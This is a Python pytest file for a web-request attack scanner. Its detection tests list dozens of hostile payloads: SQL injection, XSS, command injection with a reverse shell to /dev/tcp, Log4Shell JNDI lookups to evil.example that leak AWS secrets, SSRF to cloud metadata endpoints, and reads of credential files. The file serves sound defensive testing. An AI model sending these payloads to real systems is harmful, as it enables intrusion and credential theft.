import pytest

from gatekeeper.rules import decode, normalize, scan


@pytest.mark.parametrize(
    "payload,rule",
    [
        ("/x?id=1 UNION SELECT password FROM users", "sqli"),
        ("/x?id=1 OR 1=1", "sqli"),
        ("/x?q=admin'--", "sqli"),
        ("/x?q=1; DROP TABLE users", "sqli"),
        ("/x?q=<script>alert(1)</script>", "xss"),
        ("/x?q=<img src=x onerror=alert(1)>", "xss"),
        ("/x?f=../../etc/passwd", "path_traversal"),
        ("/x?f=%2e%2e%2f%2e%2e%2fsecret", "path_traversal"),
        ("/x?q=%253Cscript%253E", "xss"),  # doble codificación
        # firmas añadidas en v0.3 (medidas contra el corpus, no a ojo)
        ("/x?q=1' ORDER BY 10--", "sqli"),  # sondeo de columnas
        ("/x?q=' OR EXISTS(SELECT * FROM usuarios)--", "sqli"),  # subconsulta
        ("/x?q=1) OR (1=1", "sqli"),  # tautología con paréntesis
        ("/x?q=') OR ('1'='1", "sqli"),
        ("/x?q=WAITFOR DELAY '0:0:5'", "sqli"),  # time-based SQL Server
        ("/x?q=1 AND pg_sleep(5)", "sqli"),  # time-based PostgreSQL
        ("/x?q=1; EXEC xp_cmdshell 'dir'", "sqli"),  # comando del sistema
        ("/x?q=1' AND 1=CONVERT(int,(SELECT 1))--", "sqli"),  # error-based
        ("/x?q=/etc/shadow", "sensitive_files"),
        ("/x?q=/home/user/.ssh/id_rsa", "sensitive_files"),
        ("/x?q=/var/www/app/.env", "sensitive_files"),
        # firmas de 0.3.1: cerraron los últimos fallos del corpus (83/83)
        ("/x?q=&#60;script&#62;alert(1)&#60;/script&#62;", "xss"),  # entidad numérica
        ("/x?q=<a href=&#106;avascript:alert(1)>x</a>", "xss"),  # entidad en el esquema
        ("/x?f=..%c0%af..%c0%afetc/passwd", "path_traversal"),  # UTF-8 sobre-long
        ("/x?q=1' AND ASCII(SUBSTRING(nombre,1,1))>64--", "sqli"),  # blind boolean
        ("/x?q=web-inf/web.xml", "sensitive_files"),  # Java WEB-INF
        # familias nuevas de 0.3.1 (B3): medidas y añadidas al corpus
        ("/x?user[$ne]=x", "nosql"),  # bypass de login
        ('/x?q={"user": {"$ne": ""}}', "nosql"),  # $ne en JSON
        ("/x?q=password[$nin][]=root", "nosql"),  # bypass con $nin
        ("/x?q=$where=this.password.match(/^a/)", "nosql"),  # JS en MongoDB
        ("/x?q=name[$regex]=^adm", "nosql"),  # exfiltración por regex
        ("/x?q=user[%24ne]=x", "nosql"),  # operador codificado
        ("/x?q=; ls -la /tmp", "cmdi"),  # separador ;
        ("/x?q=| cat /var/log/secure", "cmdi"),  # pipe
        ("/x?q=&& whoami", "cmdi"),  # cadena &&
        ("/x?q=$(id)", "cmdi"),  # sustitución $( )
        ("/x?q=`uname -a`", "cmdi"),  # backticks
        ("/x?q=powershell.exe -enc SQBFAFgA", "cmdi"),  # LOLBin Windows
        ("/x?q=;system('id')", "cmdi"),  # webshell PHP
        ("/x?q=shell_exec('cat /var/log/syslog')", "cmdi"),  # función PHP
        ("/x?q=bash -i >& /dev/tcp/10.0.0.1/4444", "cmdi"),  # reverse shell
        ("/x?url=http://169.254.169.254/latest/meta-data/", "ssrf"),
        ("/x?url=http://169.254.170.2/v2/credentials", "ssrf"),  # ECS
        ("/x?url=http://metadata.google.internal/computeMetadata/v1/", "ssrf"),
        ("/x?url=file:///var/www/app/config.php", "ssrf"),
        ("/x?url=gopher://127.0.0.1:6379/_SET", "ssrf"),
        ("/x?url=dict://127.0.0.1:6379/info", "ssrf"),
        ("/x?url=http://100.100.100.200/latest/meta-data/", "ssrf"),  # Alibaba
        ("/x?q={{7*7}}", "ssti"),  # Jinja2/Twig
        ("/x?q={{ 9*9 }}", "ssti"),
        ("/x?q=${7*7}", "ssti"),
        ("/x?q=<%= 7*7 %>", "ssti"),  # ERB/JSP
        ("/x?q=#{7*7}", "ssti"),  # Ruby/Java EL
        ("/x?q={{config.items()}}", "ssti"),  # volcado de configuración
        ("/x?q={{self.__dict__['__init__']}}", "ssti"),  # escapada
        ("/x?q=a\r\nSet-Cookie: admin=1", "crlf"),  # splitting real
        ("/x?q=%0d%0aLocation:%20http://evil.example", "crlf"),  # codificado
        ("/x?q=line1\\r\\nX-Injected: yes", "crlf"),  # literal escapado
        ("/x?q=${jndi:ldap://evil.example/a}", "log4shell"),  # canónico
        ("/x?q=${jndi:rmi://evil.example:1099/x}", "log4shell"),  # RMI
        ("/x?q=${${::-j}ndi:ldap://evil.example/a}", "log4shell"),  # decoy
        ("/x?q=${jndi:${lower:l}${lower:d}ap://evil/a}", "log4shell"),  # lookups
        ("/x?q=${env:AWS_SECRET_ACCESS_KEY}", "log4shell"),  # exfil por logs
        ("/x?q=jndi:ldap://evil.example:1389/a", "log4shell"),  # sin ${ }
        ("/x?q=__proto__[isAdmin]=true", "proto_pollution"),
        ('/x?q={"__proto__": {"admin": true}}', "proto_pollution"),
        ("/x?q=constructor.prototype.polluted=1", "proto_pollution"),
        # evasiones de 0.3.1 sobre familias existentes
        ("/x?q=&lt;script&gt;alert(1)&lt;/script&gt;", "xss"),  # entidad nombrada
        ("/x?q=java\tscript:alert(1)", "xss"),  # tab en el esquema (WHATWG)
        ("/x?q=javascript&colon;alert(1)", "xss"),  # &colon; nombrada
        ("/x?q=1 /*!50000union*/ select password from users", "sqli"),
        ("/x?q=1%2F*!50000union*%2F+select+1,2,3", "sqli"),  # versionado codificado
        # firmas de 0.3.1 (B7): cerradas contra los misses del corpus de CRS,
        # que subieron del 21,0% al 27,1%. Cada una cubre una técnica
        # documentada, no un caso concreto del examen.
        ("/x?q=1' || select password from users--", "sqli"),  # concatenación
        ("/x?id=ABS(-1)", "sqli"),  # función SQL en un parámetro
        ("/x?id=CAST(1 AS INT)", "sqli"),
        ("/x?id=CHAR(65)", "sqli"),
        ("/x?id=1 REGEXP '^a'", "sqli"),  # operador tolerante
        ("/x?id=1 LIKE NULL", "sqli"),
        ("/x?id=1 >> 2", "sqli"),
        ("/x?q=<x:script xmlns:x='http://www.w3.org/1999/xhtml'>alert(1)</x:script>", "xss"),
        ("/x?q=<svg/onload=alert(1)>", "xss"),  # SVG con handler
        ("/x?q=eval(atob('YWxlcnQoMSk='))", "xss"),  # eval DOM
        ("/x?q=document.cookie", "xss"),  # robo de cookie vía DOM
        ("/x?q=setInterval(code,1)", "xss"),
        ("/x?f=/sys/class", "sensitive_files"),  # reconocimiento del sistema
        ("/x?f=/.claude/settings.json", "sensitive_files"),
        ("/x?f=/.aws/config", "sensitive_files"),
    ],
)
def test_detects_attacks(payload, rule):
    assert scan(payload) == rule


@pytest.mark.parametrize(
    "payload",
    [
        "/search?q=hello world",
        "/users?online=1&order=asc",
        "/search?q=union station select seats",
        "/items?price=10&limit=5",
        # firmas v0.3: casos que NO deben bloquearse (regresión de FP)
        "/search?q=sort order by date asc",  # «order by» sin número
        "/search?q=convert int to string en python",  # convert sin (int
        "/search?q=when to use exists in sql",  # exists sin subconsulta
        "/search?q=.env",  # sin separador de ruta delante
        "/search?q=id_rsa vs ed25519",  # sin la ruta .ssh/
        "/api?q=seleccionar la mejor opcion",  # «seleccionar» no es «select»
        "/search?q=benchmark test results",  # sin paréntesis numérico
        # fronteras de 0.3.1: los negativos que las familias nuevas NO deben tocar
        "/api/items?precio[$gt]=10",  # $gt es filtro legítimo, no firma NoSQL
        '/x?q={"filters": {"price": {"$gt": 10}}}',  # idem en JSON
        "/search?q=angular+{{user.name}}+binding",  # plantilla de cliente
        "/search?q=curl+vs+wget+para+descargas",  # binario sin separador
        "/auth/callback?redirect_uri=http://localhost:3000/cb",  # OAuth dev
        "/search?q=set-cookie+header+http",  # cabecera sin CRLF delante
        "/search?q=${HOME}+variable+de+entorno",  # variable, no lookup
        "/api/list?sort=asc;type=json",  # ; como separador de params
        "/search?q=java+script:+los+dos+palabras",  # espacio no es esquema
        "/search?q=constructor+of+class+in+python",  # sin .prototype
        "/search?q=options+|+set+up+guide",  # prosa tras pipe
        # fronteras de las firmas de B7: la técnica en prosa NO debe bloquear
        "/search?q=que+significa+ABS+en+matematicas",  # nombre de función suelto
        "/search?q=tutorial+de+CAST+en+java",  # cast sin paréntesis de argumento
        "/blog/comparativa-de-frameworks-web",  # 'web' no dispara nada
    ],
)
def test_benign_requests_pass(payload):
    assert scan(payload) is None


def test_disabled_rule_is_skipped():
    assert scan("/x?id=1 OR 1=1", disabled={"sqli"}) is None


def test_entity_and_overlong_decoding():
    assert decode("&#99999999;") == "&#99999999;"  # fuera de rango: sin cambios
    assert decode("&#38;#60;") == "<"  # entidad doble, resuelta en dos rondas
    assert decode("%u00c0%u00af") == "/"  # %u → caracteres → sobre-long
    assert normalize("q=&#106;avascript:alert(1)") == "q=javascript:alert(1)"


def test_normalize_handles_double_encoding():
    assert normalize("%253Cscript") == "<script"


def test_sql_comment_obfuscation_is_stripped():
    """`/**/` es espacio en blanco en MySQL: `1'/**/OR/**/1=1` no debe colarse."""
    assert normalize("1'/**/OR/**/1=1") == "1' or 1=1"
    assert scan("/x?q=1'/**/OR/**/1=1") == "sqli"


def test_versioned_comment_is_unwrapped_not_deleted():
    """`/*!50000union*/` se EJECUTA en MySQL: desenvolverlo, no borrarlo."""
    assert normalize("1 /*!50000union*/ select 1") == "1  union  select 1"
    assert normalize("1 /*!union*/ select 1") == "1  union  select 1"
    # sin cierre no hay carrera ni deshacer: queda tal cual, acotado
    assert "/*" in normalize("1 /*!50000" + "union" * 500)


def test_custom_rules_are_scanned_and_can_be_disabled():
    import re

    extra = {"wp-probe": [re.compile(r"wp-login\.php")]}
    assert scan("/WP-Login.php", extra=extra) == "wp-probe"
    assert scan("/wp-login.php", disabled={"wp-probe"}, extra=extra) is None


def test_no_redos_on_pathological_input():
    import time

    for payload in ["<" * 1_000_000, "union" + " " * 1_000_000, "<a" * 500_000,
                    "<on" + "a" * 1_000_000]:
        t = time.perf_counter()
        scan(payload)
        assert time.perf_counter() - t < 2.0


def test_no_redos_on_new_families():
    """Las familias de 0.3.1 también van acotadas: ReDoS es un DoS real."""
    import time

    patologicos = [
        "{" * 1_000_000,  # ssti: `{{` sin cierre
        "$" * 500_000,  # nosql/log4shell: `$` sueltos
        "${" * 200_000,  # log4shell: `${` sin cerrar
        ";" + "a" * 1_000_000,  # cmdi: separador sin binario
        "; " * 300_000 + "ls",  # cmdi: separadores repetidos
        "\r\n" * 200_000 + "x-foo: 1",  # crlf: saltos encadenados
        "169.254." * 100_000,  # ssrf: IP incompleta y larga
        "__proto__" * 100_000,  # proto_pollution
        "&lt;" * 200_000,  # entidades nombradas sin resolver
        "/*!50000" + "union" * 100_000,  # comentario versionado sin cerrar
        "j\ta\rv\nn\ta\r" * 50_000 + ":",  # esquema con contenedores
    ]
    for payload in patologicos:
        t = time.perf_counter()
        scan(payload)
        elapsed = time.perf_counter() - t
        assert elapsed < 2.0, f"scan tardó {elapsed:.2f}s con {payload[:24]!r}"


def test_family_names_are_valid_disabled_rules():
    """Los nombres de `disabled_rules` se validan contra RULES al arrancar."""
    from gatekeeper.config import Config

    familias = {"nosql", "cmdi", "ssrf", "ssti", "crlf", "log4shell", "proto_pollution"}
    config = Config(disabled_rules=familias)  # no lanza: todas existen
    assert config.disabled_rules == familias
    with pytest.raises(ValueError):
        Config(disabled_rules={"no-existe"})
